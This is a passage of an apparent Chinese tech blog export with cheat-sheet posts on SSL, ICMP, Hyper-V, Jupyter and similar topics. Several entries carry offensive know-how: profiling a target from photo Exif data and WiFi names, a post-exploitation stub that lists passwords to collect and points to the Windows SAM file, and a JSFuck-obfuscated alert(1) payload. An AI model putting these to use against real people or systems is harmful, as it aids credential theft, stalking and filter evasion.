<p>SSL 经常用来为发生在 HTTP 之上的事务提供安全性。然而，因为 SSL 使 TCP 安全了，因此它能被应用于运行在 TCP 之上的任何应用程序。</p>
<h2 id="SSL-工作过程"><a href="#SSL-工作过程" class="headerlink" title="SSL 工作过程"></a>SSL 工作过程</h2><p>SSL 具有三个阶段：<strong>握手</strong>、<strong>密钥导出</strong>和<strong>数据传输</strong>：</p>
<h3 id="握手"><a href="#握手" class="headerlink" title="握手"></a>握手</h3><p>SSL 握手步骤如下：</p>
<ol>
<li>客户发送它支持的密码算法的列表（cipher suit），连同一个客户的不重数。</li>
<li>从该列表中，服务器选择一种对称算法（例如 AES）、一种公钥算法（例如具有特定密钥长度的 RSA）和一种 MAC 算法（即哈希算法）。它把它的选择以及证书和一个服务器不重数返回给客户。</li>
<li>客户验证该证书，提取服务器的公钥，生成一个<strong>前主密钥</strong>（Pre-Master Secret，<strong>PMS</strong>），用服务器的公钥加密该 PMS，并将加密的 PMS 发送给服务器。</li>
<li>使用相同的密钥导出函数（就像 SSL 标准定义的那样），客户和服务器独立地从 PMS 和不重数中计算出<strong>主密钥</strong>（Master Secret，<strong>MS</strong>）。然后该 MS 被切片以生成两个密码和两个 MAC 密钥。此外，当选择的对称密码应用于 CBC（例如 3DES 或 AES），则两个初始向量（IV）也从该 MS 获得，这两个 IV 分别用于该连接的两端。自此以后，客户和服务器之间发送的所有报文均被加密和鉴别（使用 MAC）。具体可见下节密钥导出。</li>
<li>客户发送所有握手报文的一个 MAC。</li>
<li>服务器发送所有握手报文的一个 MAC。</li>
</ol>
<p>最后两个步骤使握手免受篡改危害。</p>
<h3 id="密钥导出"><a href="#密钥导出" class="headerlink" title="密钥导出"></a>密钥导出</h3><p>客户和服务器都使用 MS 生成 4 个密钥：</p>
<ul>
<li>$E_C$：用于从客户（C）发送到服务器（S）的数据的会话加密密钥（用于机密性）</li>
<li>$M_C$：用于从客户（C）发送到服务器（S）的数据的会话 MAC 密钥（用于完整性）</li>
<li>$E_S$：用于从服务器（S）发送到客户（C）的数据的会话加密密钥（用于机密性）</li>
<li>$M_S$：用于从服务器（S）发送到客户（C）的数据的会话 MAC 密钥（用于完整性）</li>
</ul>
<h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>由于 TCP 是一种字节流协议，SSL 将数据流分割成 <em>记录</em>，对每个记录附加一个 MAC 用于完整性检查，然后加密该“记录+MAC”。为了产生这个 MAC，客户将数据连同密钥 $M_C$ 放入一个散列函数中；为了加密“记录+MAC”这个包，客户使用它的会话加密密钥 $E_C$。然后这个加密的包将传递给 TCP 经因特网传输。</p>
<p>为了防止诸如重排序或重放报文段等中间人攻击，SSL 使用序号，具体而言，客户维护一个序号计数器，计数器开始为 0，客户每发送的一个 SSL 记录它都增加 1。客户并不实际在记录中包括一个序号，但当它计算 MAC 时，它把该序号包括在 MAC 的计算中。所以，该 MAC 现在是数据加 MAC 密钥 $M_C$ 加 <em>当前序号</em> 的哈希值。服务器跟踪客户的序号，通过在 MAC 的计算中包括适当的序号，使它验证一条记录的数据完整性。</p>
<p>总而言之，在 SSL 中，不重数用于防御“连接重复”，而序号用于防御在一个进行中的会话中重放个别分组。</p>
<p>一个 SSL 记录如下图所示：</p>
<p><img src="/images/ssl.jpg" alt="ssl"></p>
<p>该记录由类型字段、版本字段、长度字段、数据字段和 MAC 字段组成。注意到前 3 个字段是不加密的。类型字段指出了该字段是握手报文还是包含应用数据的报文。它也用于关闭 SSL 连接，如下面所讨论。在接收端的 SSL 使用长度字段以从到达的 TCP 字节流中提取 SSL 记录。版本字段是自解释的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:385-414.</a></li>
<li><a href="https://www.aqniukt.com/goods/show/79">苑房弘 —— Kali Linux 安全测试：课时 103 —— 105</a></li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>基于人的信息收集</title>
    <url>/2018/09/09/human-based-information-gathering/</url>
    <content><![CDATA[<h2 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h2><p>根据目标朋友圈、微博等社交网络所发的照片，查看Exif信息，可得到目标当时的位置、相机规格等信息。</p>
<h2 id="WiFi"><a href="#WiFi" class="headerlink" title="WiFi"></a>WiFi</h2><p>根据目标所连接的WiFi名称可大致判断目标所在的位置，多数情况下，WiFi的名称一般为所在旅馆、餐馆、机构等名称的缩写。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>Hyper-V 相关问题解决</title>
    <url>/2018/08/20/hyper-v-problem/</url>
    <content><![CDATA[<h2 id="全屏问题"><a href="#全屏问题" class="headerlink" title="全屏问题"></a>全屏问题</h2><p>由于 Hyper-V 最初是为服务器设计的，所以到目前为止，Hyper-V 对于全屏的支持没有 VMware 做得好，同样，Hyper-V 也不能像 VMware 那样随意更改窗口大小，这多少显得很不方便。</p>
<p>对于 Windows 虚拟机的全屏操作，目前较为理想的解决方案是使用<strong>远程桌面连接</strong>，记得要在虚拟机中开启远程桌面连接功能；而对于 Linux 虚拟机的全屏操作，可以通过修改 <code>/etc/default/grub</code> 文件，更改其中 <code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash video=hyperv_fb:1920x1080&quot;</code>（注意是 <code>x</code> 不是 <code>*</code>），接着执行 <code>update-grub</code> 并重启即可。</p>
<span id="more"></span>

<h2 id="显卡问题"><a href="#显卡问题" class="headerlink" title="显卡问题"></a>显卡问题</h2><p>开启 Hyper-V 功能后，原主机的显卡可能会出现问题，对于我当时的 1803 版 Win10 来说，电脑中原来的 <strong>Intel(R) HD Graphics 4600</strong> 核芯显卡（针对我的电脑而言）不能正常工作，具体表现在工具栏中<strong>英特尔核芯显卡</strong>控制面板图标消失，以及系统设置中莫名出现多个显示器，最直观的感受是每当点亮屏幕，图像显示会变慢，并且有一个逐渐适配屏幕大小的过程。</p>
<p>究其原因是系统中原本的 4624 版驱动程序与 Hyper-V 不兼容，解决办法是去<a href="https://downloadcenter.intel.com/zh-cn">官网</a>下载最新版驱动程序并升级即可。</p>
<p>具体操作步骤可参考<a href="https://www.youtube.com/watch?v=dYfeOnFZegI&ab_channel=AlexanderSchmidt">此视频</a> 。</p>
<h2 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h2><p>由于 Hyper-V 采用的是硬件虚拟化技术，所以开启 Hyper-V 功能后相当于原本的物理机也运行在虚拟化上了，因此不能再使用 VMware 或者 VirtualBox，它们不允许在虚拟机上运行虚拟机，而此时原主机在它们眼中就是一个虚拟机。</p>
<p>早期的 Android Studio 中自带的模拟器也会由于这种原因导致模拟器无法启动，只需将模拟器升级到最新版即可解决，Android Studio 3.1.4 版之后自带模拟器（v27.3.9）已经可以支持 Hyper-V，在开启 Hyper-V 的系统中，它使用 <strong>Windows 虚拟机监控程序平台</strong>替代了 Intel 的 <strong>HAXM</strong>，使用前需要在 Windows 功能中启用 <strong>Windows 虚拟机监控程序平台</strong>功能。</p>
<h2 id="网卡问题"><a href="#网卡问题" class="headerlink" title="网卡问题"></a>网卡问题</h2><p>要想使 Hyper-V 中的虚拟机上网，可以通过创建<strong>虚拟交换机</strong>实现，虚拟交换机有 3 种类型，<strong>外部</strong>相当于 VMware 的<strong>桥接模式</strong>，<strong>内部</strong>相当于 VMware 的 <strong>NAT 模式</strong>，<strong>专用</strong>相当于 VMware 的<strong>仅主机模式</strong>，所有虚拟机会默认使用<strong>内部</strong>类型的<strong>默认交换机</strong>，这是<strong>虚拟交换机管理器</strong>自动创建的。</p>
<p>如果我们选择创建<strong>外部</strong>类型的虚拟交换机，则会把 Hyper-V 的网络桥接在物理网卡上，那物理网卡将变成一个虚拟交换机。因此我们会发现原来使用的网卡变成了 <strong>vEthernet</strong>，这是正常现象，不用担心。Hyper-V 会自动创建一个虚拟网卡来继承原物理网卡的配置，物理计算机可以正常使用网络。</p>
<h2 id="代数问题"><a href="#代数问题" class="headerlink" title="代数问题"></a>代数问题</h2><p>在创建虚拟机时可以选择虚拟机代数，简单来说，第一代虚拟机支持创建 32 位与 64 位操作系统，创建的虚拟硬盘为 <code>.vhd</code> 格式，第二代虚拟机只能创建 64 位操作系统，创建的虚拟硬盘为 <code>.vhdx</code> 格式，并且必须是 Windows 8 或 Windows Server 2012 以上版本，对于 Linux，微软官方有一份详细的清单表明哪些版本可以创建第二代虚拟机。</p>
<p>为方便起见，可以在首次创建时选择第二代虚拟机，若不能成功启动，且屏幕显示 <code>No operating system was loaded. Press a key to retry the boot sequence...</code> 信息，则可以在设置中关闭<strong>安全启动</strong>并重启虚拟机，或者删掉虚拟机并重新创建第一代虚拟机。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ICMP 运行机制</title>
    <url>/2021/03/06/icmp/</url>
    <content><![CDATA[<p><strong>ICMP</strong>（Internet Control Message Protocol，<strong>因特网控制报文协议</strong>）被主机和路由器用来彼此沟通网络层的信息。ICMP 最典型的用途是差错报告。</p>
<p>ICMP 报文有一个类型字段和一个编码字段，并且包含引起该 ICMP 首次生成的 IP 数据报的首部和前 8 个字节（以便发送方能确定引发该差错的数据报）。下表是相关的 ICMP 报文类型：</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th>ICMP 类型</th>
<th>编码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>回显回答（对 <code>ping</code> 的回答）</td>
</tr>
<tr>
<td>3</td>
<td>0</td>
<td>目的网络不可达</td>
</tr>
<tr>
<td>3</td>
<td>1</td>
<td>目的主机不可达</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>目的协议不可达</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>目的端口不可达</td>
</tr>
<tr>
<td>3</td>
<td>6</td>
<td>目的网络未知</td>
</tr>
<tr>
<td>3</td>
<td>7</td>
<td>目的主机未知</td>
</tr>
<tr>
<td>4</td>
<td>0</td>
<td>源抑制（拥塞控制）</td>
</tr>
<tr>
<td>8</td>
<td>0</td>
<td>回显请求</td>
</tr>
<tr>
<td>9</td>
<td>0</td>
<td>路由器通告</td>
</tr>
<tr>
<td>10</td>
<td>0</td>
<td>路由器发现</td>
</tr>
<tr>
<td>11</td>
<td>0</td>
<td>TTL 过期</td>
</tr>
<tr>
<td>12</td>
<td>0</td>
<td>IP 首部损坏</td>
</tr>
</tbody></table>
<p>注意到 ICMP 报文并不仅是用于通知差错情况。</p>
<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a><code>ping</code></h2><p><code>ping</code> 程序发送一个 ICMP 类型 8 编码 0 的报文到指定主机。看到回显（echo）请求，目的主机发回一个类型 0 编码 0 的 ICMP 回显回答。</p>
<p>当 <code>ping</code> 一个不存在的 IP 时，会收到目的主机不可达（类型 3 编码 1）的响应。</p>
<h2 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a>Traceroute</h2><p>Traceroute 在 Linux 中一般为 <code>tracepath</code>，在 Windows 中一般为 <code>tracert</code>。该程序允许我们跟踪从一台主机到世界上任意一台主机之间的路由。其用 ICMP 报文来实现。</p>
<p>为了判断源和目的地之间所有路由器的名字和地址，源主机中的 Traceroute 向目的地主机发送一系列普通的 IP 数据报。这些数据报的每个携带了一个具有不可达 UDP 端口号的 UDP 报文段。第一个数据报的 TTL 为 1，第二个的 TTL 为 2，第三个的 TTL 为 3，依此类推。该源主机也为每个数据报启动定时器。当第 n 个数据报到达第 n 台路由器时，第 n 台路由器观察到这个数据报的 TTL 正好过期。根据 IP 协议规则，路由器丢弃该数据报并发送一个 ICMP 告警报文给源主机（类型 11 编码 0）。该告警报文包含了路由器的名字和它的 IP 地址。当该 ICMP 报文返回源主机时，源主机从定时器得到往返时延，从 ICMP 报文中得到第 n 台路由器的名字与 IP 地址。</p>
<p>这些数据报之一将最终沿着这条路到达目的主机。因为该数据报包含了一个具有不可达端口号的 UDP 报文段，该目的主机将向源发送一个端口不可达的 ICMP 报文（类型 3 编码 3）。当源主机收到这个特别的 ICMP 报文时，知道它不需要再发送另外的探测分组。</p>
<p>标准的 Traceroute 程序实际上用相同的 TTL 发送 3 个一组的分组，因此 Traceroute 输出对每个 TTL 提供了 3 个结果。</p>
<p>一个 Traceroute 运行示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tracert 185.199.109.153</span><br><span class="line"></span><br><span class="line">通过最多 30 个跃点跟踪</span><br><span class="line">到 cdn-185-199-109-153.github.com [185.199.109.153] 的路由:</span><br><span class="line"></span><br><span class="line">  1    26 ms     5 ms    51 ms  Hiwifi.lan [192.168.199.1]</span><br><span class="line">  2     *        *        *     请求超时。</span><br><span class="line">  3     9 ms    16 ms     6 ms  1.240.35.58.broad.xw.sh.dynamic.163data.com.cn [58.35.240.1]</span><br><span class="line">  4    11 ms    11 ms    10 ms  124.74.22.29</span><br><span class="line">  5     9 ms     6 ms    14 ms  61.152.24.42</span><br><span class="line">  6    27 ms    41 ms     *     202.97.50.154</span><br><span class="line">  7    21 ms    23 ms    30 ms  202.97.74.1</span><br><span class="line">  8    93 ms   102 ms   102 ms  202.97.94.10</span><br><span class="line">  9    85 ms     *        *     ae-3.r30.tokyjp05.jp.bb.gin.ntt.net [129.250.3.23]</span><br><span class="line"> 10     *       83 ms    78 ms  ae-2.r00.tokyjp08.jp.bb.gin.ntt.net [129.250.6.127]</span><br><span class="line"> 11    85 ms     *       81 ms  ae-2.fastly.tokyjp08.jp.bb.gin.ntt.net [117.103.177.66]</span><br><span class="line"> 12    72 ms    70 ms    80 ms  cdn-185-199-109-153.github.com [185.199.109.153]</span><br><span class="line"></span><br><span class="line">跟踪完成。</span><br></pre></td></tr></table></figure>

<p>可以看到输出有 6 列：</p>
<ul>
<li>第一列：前面描述的 n 值，即路径上的路由器编号</li>
<li>第二、三、四列：3 次实验的往返时延</li>
<li>第五列：路由器的名字</li>
<li>第六列：路由器地址</li>
</ul>
<p>如果源从任何给定路由器接收到的报文少于 3 条（由于网络中的丢包），Traceroute 在该路由器号码后面放一个星号，并向那台路由器报告少于 3 次往返时间。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ICMP 通常被认为是 IP 的一部分，但从体系结构上讲它位于 IP 之上，因为 ICMP 报文是承载在 IP 分组中的。这就是说，ICMP 报文是作为 IP 有效载荷承载的，就像 TCP 与 UDP 报文段作为 IP 有效载荷被承载那样。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>ifconfig与ip</title>
    <url>/2018/09/12/ifconfig-ip/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透测试阶段的信息收集</title>
    <url>/2018/05/09/information-gathering-of-post-exploitation/</url>
    <content><![CDATA[<p>浏览器密码、历史，电脑密码，邮箱密码，QQ 聊天记录，最近打开的文件，环境变量，持久后门</p>
<p>我们假设客户端为 Windows 系统，服务器为 Linux 系统，下面分别针对客户端与服务器进行信息收集。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="登录密码"><a href="#登录密码" class="headerlink" title="登录密码"></a>登录密码</h3><p>Windows 的登录密码保存在 <code>%windir%\System32\config\SAM</code> 中，</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>IntelliJ 平台 IDE 中 Ctrl+Shift+F 快捷键无效问题解决</title>
    <url>/2021/05/02/intellij-platform-ctrl-shift-f-not-working/</url>
    <content><![CDATA[<p>在 IntelliJ 平台 IDE 中（如 PyCharm、IntelliJ IDEA 等），Ctrl+Shift+F 快捷键通常指在项目所有文件中搜索对应的关键词，这是一个常用的功能，然而近期笔者发现此快捷键莫名其妙的失效了（其他快捷键都工作良好），这很可能是与别的程序的快捷键相冲突导致的，经排查，是与 Windows 10 中微软拼音的简繁转换快捷键冲突。</p>
<p>解决步骤依次为：<strong>设置</strong> ——&gt; <strong>时间和语言</strong> ——&gt; <strong>语言</strong> ——&gt; <strong>中文（简体，中国）</strong>——&gt; <strong>选项</strong> ——&gt; <strong>微软拼音</strong> ——&gt; <strong>选项</strong> ——&gt; <strong>按键</strong> ——&gt; <strong>简体/繁体中文输入切换</strong>，可以将其改为另一个键或者直接将其关闭。</p>
<p>此解决方案可能并不适应于每个人，具体还是要找到那个冲突的快捷键。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
  </entry>
  <entry>
    <title>IP 协议分析</title>
    <url>/2018/05/11/ip/</url>
    <content><![CDATA[<p>IP（Internet Protocol，网际协议）</p>
<h2 id="数据报格式"><a href="#数据报格式" class="headerlink" title="数据报格式"></a>数据报格式</h2><p><img src="/images/ip.PNG" alt="ip datagram"></p>
<span id="more"></span>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>IPSec 运行机制</title>
    <url>/2018/05/11/ipsec/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 IPython 替代原生 Python Shell</title>
    <url>/2018/09/16/ipython/</url>
    <content><![CDATA[<p>我算是个原教主义者，喜欢原生的东西，不太喜欢第三方的东西，但 IPython 相比原生 Python Shell 的众多优秀特性，让我不由得使用上它。</p>
<h2 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h2><p><a href="https://ipython.org/"><strong>IPython</strong></a> 最初只是一种基于 Python 的交互式解释器（REPL），慢慢的，IPython 项目中集成了许多新的工具，比如 <strong>IPython Notebook</strong>，这是一种基于 Web 的强大编辑器。从 IPython 4.0 开始，IPython 项目中和语言无关的工具已独立出来形成一个新的项目 <a href="http://jupyter.org/"><strong>Jupyter</strong></a>，从此，IPython Notebook 升级为 <strong>Jupyter Notebook</strong>，开始支持更多的编程语言。而 IPython 将只专注于提供 Python 交互式解释器以及为 Jupyter 提供 Python 内核。当写这篇文章时，IPython 的最新版本为 7.12.0。</p>
<p>如今，当你去 IPython 官网下载时，它会跳转到 Jupyter 的下载页面，因为 Jupyter 中已经包含了 IPython，同时也建议下载 Jupyter，因为其包含了强大的 Jupyter Notebook，使用 <code>pip install jupyter</code> 即可下载，安装完成后直接输入 <code>ipython</code> 即可进入 IPython 交互式环境。</p>
<span id="more"></span>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>以下仅列出 IPython 相比原生 Python Shell 的一些优势：</p>
<ul>
<li>Tab 自动补全</li>
<li>自动缩进</li>
<li>语法高亮</li>
<li>支持命令历史记录</li>
<li>命令前加 <code>!</code> 可调用系统命令</li>
<li>命令后加 1 个或 2 个 <code>?</code> 可方便查看对象信息</li>
<li>有众多的魔法函数（Magic Functions）</li>
</ul>
<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>以下仅列出 IPython 中使用较多的魔法函数：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">%timeit  <span class="comment"># 测试代码段执行时间</span></span><br><span class="line">%hist    <span class="comment"># 查看历史记录</span></span><br><span class="line">%debug   <span class="comment"># 激活交互的调试器(ipdb)</span></span><br><span class="line">%load    <span class="comment"># 加载外部代码</span></span><br><span class="line">%edit    <span class="comment"># 使用编辑器打开</span></span><br></pre></td></tr></table></figure>

<p>要查看更多的魔法函数，可以访问 <a href="https://ipython.readthedocs.io/en/stable/interactive/magics.html">IPython 的官方文档</a></p>
<h2 id="Jupyter-Notebook"><a href="#Jupyter-Notebook" class="headerlink" title="Jupyter Notebook"></a>Jupyter Notebook</h2><p>要启动 Jupyter Notebook 直接在命令行输入 <code>jupyter notebook</code> 即可，它会监听本机的 8888 端口，并自动打开浏览器访问。输入 <code>jupyter notebook --help</code> 可以查看它的更多参数。</p>
<p>Jupyter Notebook 默认采用 <strong>Token</strong> 的方式进行登录，启动后在命令行中会显示当前的 token 值，若没有自动打开浏览器，则可以复制命令行中带 token 的链接并在浏览器中打开即可。</p>
<p>使用命令 <code>jupyter notebook --generate-config</code> 可生成 Jupyter Notebook 配置文件，默认为 <code>$HOME/.jupyter/jupyter_notebook_config.py</code> 文件。常用的配置项如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置是否允许root用户运行，改为`True`则允许</span></span><br><span class="line">c.NotebookApp.allow_root = False</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置监听地址，改为`*`可监听所有IP</span></span><br><span class="line">c.NotebookApp.ip = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置启动后显示的目录，默认为启动时输入命令的目录</span></span><br><span class="line">c.NotebookApp.notebook_dir = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置启动时是否自动打开浏览器，若在远程服务器上启动Jupyter Notebook，</span></span><br><span class="line"><span class="comment"># 则没必要打开浏览器，改为`False`即可</span></span><br><span class="line">c.NotebookApp.open_browser = True</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置登录密码，需要存储密文形式，使用`jupyter notebook password`命令</span></span><br><span class="line"><span class="comment"># 可生成加密后的密码</span></span><br><span class="line">c.NotebookApp.password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置监听端口</span></span><br><span class="line">c.NotebookApp.port = 8888</span><br></pre></td></tr></table></figure>

<p>最后，在 Linux 下，使用 <code>nohup jupyter notebook &gt; jupyter.log &amp;</code> 可使 Jupyter Notebook 在后台运行并记录日志到当前目录下的 <code>jupyter.log</code> 文件中。</p>
<p>要了解 Jupyter Notebook 的更多信息，可参考另一篇博文：<a href="/2018/09/25/jupyter-notebook-extensions/" title="Jupyter Notebook 常用扩展">Jupyter Notebook 常用扩展</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>盘点那些互联网公司的学生优惠</title>
    <url>/2018/09/26/it-student-discount/</url>
    <content><![CDATA[<h2 id="JetBrains"><a href="#JetBrains" class="headerlink" title="JetBrains"></a><a href="https://www.jetbrains.com/">JetBrains</a></h2><p>JetBrains是捷克的一家软件公司，该公司专业生产各种编程语言的IDE，其中包括Java的IDE —— <a href="https://www.jetbrains.com/idea/">Intellij IDEA</a>，Python的IDE —— <a href="https://www.jetbrains.com/pycharm/">PyCharm</a>，JavaScript的IDE —— <a href="https://www.jetbrains.com/webstorm/">WebStorm</a>，C/C++的IDE —— <a href="https://www.jetbrains.com/clion/">CLion</a>等等。JetBrains系列的IDE一直以强大易用著称，甚至有人说，一个优秀的程序员应该使用JetBrains全家桶。<br>JetBrains的大多数IDE都是收费的，有的分为社区版（Community Edition）和专业版（Professional Edition）两种，专业版相比社区版有更多的功能，但也会收取相应的费用，然而，JetBrains对学生提供<a href="https://www.jetbrains.com/zh/student/">免费授权计划</a>，学生只要验证学生身份即可免费使用JetBrains的所有IDE。</p>
<span id="more"></span>
<h2 id="Microsoft-Imagine"><a href="#Microsoft-Imagine" class="headerlink" title="Microsoft Imagine"></a><a href="https://imagine.microsoft.com/zh-CN">Microsoft Imagine</a></h2><p>Microsoft Imagine原名为DreamSpark，是微软为学生提供的一个资源集合，它包括了一些<a href="https://imagine.microsoft.com/zh-cn/catalog">软件和服务</a>，学生只要验证学生身份即可使用其中的工具。<br>个人认为，Imagine相比之前的DreamSpark，为学生提供的免费资源少了许多。具体而言，它提供如下资源：</p>
<ul>
<li>Parallels Desktop for Mac Pro Edition：macOS上最好的虚拟机产品，提供免费试用3个月</li>
<li>Visual Studio Community 2017：原本就是免费的</li>
<li>面向学生的 Microsoft Azure 入门版</li>
<li>Microsoft虚拟学院课程：原本就是免费的</li>
<li>Pluralsight</li>
<li>SQL Server 2017 Developer Edition</li>
<li>Visual Studio Code：微软推出的编辑器，原本就是开源免费的</li>
<li>Visual Studio for Mac：原本就是免费的</li>
<li>Windows Embedded 8.1 Industry Pro Update</li>
<li>Windows Server 2016</li>
<li>Windows应用商店免费开发人员帐户</li>
<li>WintellectNow</li>
<li>Xamarin Studio Community Edition：原本就是免费的</li>
<li>Visual Studio的PHP Tools插件</li>
</ul>
<h2 id="GitHub-Student-Developer-Pack"><a href="#GitHub-Student-Developer-Pack" class="headerlink" title="GitHub Student Developer Pack"></a><a href="https://education.github.com/pack">GitHub Student Developer Pack</a></h2><p>GitHub学生开发者包（GitHub Student Developer Pack）是GitHub与其他公司一起创建的，旨在让学生从一个地方免费访问最好的开发者工具，这样他们就可以边做边学。其中包括的工具有：</p>
<ul>
<li>Algolia</li>
<li>Atom：GitHub推出的编辑器，原本就是开源免费的</li>
<li>AWS</li>
<li>Bitnami</li>
<li>CARTO</li>
<li>CrowdFlower</li>
<li>Datadog</li>
<li>DigitalOcean：美国一家VPS提供商，提供50美元优惠劵</li>
<li>Flatiron School</li>
<li>GitHub无限制的私人仓库：值得注意的是，2019年1月8号之后，GitHub宣布私人仓库也可以免费使用了，在此之前，私人仓库是要收费的。</li>
<li>Gitkraken：跨平台的Git GUI客户端，提供免费一年的专业帐户</li>
<li>HackHands</li>
<li>Heroku：美国的一家PaaS厂商，提供一个长达2年的Hobby类型Dyno，Dyno是Heroku上所有应用程序的基本运行环境，Hobby类型的Dyno比免费的要稍微好一些，详细配置信息请参考<a href="https://devcenter.heroku.com/articles/dyno-types">官方文档</a></li>
<li>JetBrains系列IDE</li>
<li>Namecheap：美国的一家域名注册商，提供免费一年SSL证书、一年<code>.me</code>后缀域名优惠</li>
<li>SendGrid</li>
<li>Sentry</li>
<li>Stripe</li>
<li>Taplytics</li>
<li>Thinkful</li>
<li>Transifex</li>
<li>Travis CI：一个流行的持续集成平台，针对开源项目免费，此学生包提供私有项目免费使用。</li>
<li>Unreal Engine</li>
</ul>
<p>学生只要验证学生身份就可以使用GitHub学生开发者包中提供的工具。</p>
<h2 id="阿里云云翼计划"><a href="#阿里云云翼计划" class="headerlink" title="阿里云云翼计划"></a><a href="https://promotion.aliyun.com/ntms/act/campus2018.html">阿里云云翼计划</a></h2><p>学生验证学生身份后，每月仅需9.9元即可租用一台阿里云服务器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>JSFuck</title>
    <url>/2018/08/10/jsfuck/</url>
    <content><![CDATA[<p>JSFuck是一种JavaScript的编码方式，它的命名起源于Brainfuck，同样，为了避讳脏话，它又被写作JSF*ck，以JSFuck风格写出的代码不需要另外的编译器或解释器执行，原生的JavaScript解释器即可直接运行。<br>JSFuck种共使用<code>[</code>、<code>]</code>、<code>(</code>、<code>)</code>、<code>!</code>、<code>+</code>这<strong>6</strong>种字符。<code>alert(1)</code>这段JavaScript代码用JSFuck风格表示如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></p